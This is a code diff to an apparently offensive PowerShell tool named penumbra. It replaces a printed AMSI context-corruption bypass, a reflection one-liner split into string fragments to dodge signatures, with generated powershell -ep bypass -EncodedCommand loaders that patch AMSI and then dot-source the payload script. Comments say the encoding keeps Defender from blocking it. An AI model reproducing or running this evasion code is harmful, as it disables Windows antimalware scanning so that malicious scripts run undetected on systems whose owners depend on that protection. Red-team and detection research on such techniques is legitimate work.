@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import base64 as _b64
 import sys
 from pathlib import Path
 from typing import Annotated
@@ -280,15 +281,17 @@ def main(
         ]
         result = run(ps1_data, resolved_ps1, ps1_config, output_path=str(output))
         output.write_bytes(result)
-        # Print AMSI bypass (context corruption) for copy-paste.
-        # Context bypass works for Assembly.Load unlike amsiInitFailed.
-        write_hint(
-            "$u=[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils');"
-            "$u.GetField('amsi'+'Context','NonPublic,Static')"
-            ".SetValue($null,[IntPtr][Runtime.InteropServices.Marshal]::AllocHGlobal(4));"
-            "$u.GetField('amsi'+'Session','NonPublic,Static').SetValue($null,$null)"
-        )
-        write_hint(f". {output} [args]")
+        # Generate a powershell -EncodedCommand that runs the AMSI patch
+        # bypass then dot-sources the script. EncodedCommand avoids Defender
+        # blocking the bypass when typed or saved to disk.
+        from penumbra.ps.amsi import _gen_patch_bypass
+
+        bypass = _gen_patch_bypass()
+        loader_cmd = f"{bypass}\n. '{output}'"
+        # Encode as UTF-16LE Base64 for -EncodedCommand
+        utf16 = loader_cmd.encode("utf-16-le")
+        enc_cmd = _b64.b64encode(utf16).decode("ascii")
+        write_hint(f"powershell -ep bypass -EncodedCommand {enc_cmd}")
         raise typer.Exit()
 
     if clm_bypass and pipe_type == PipelineType.PS1:
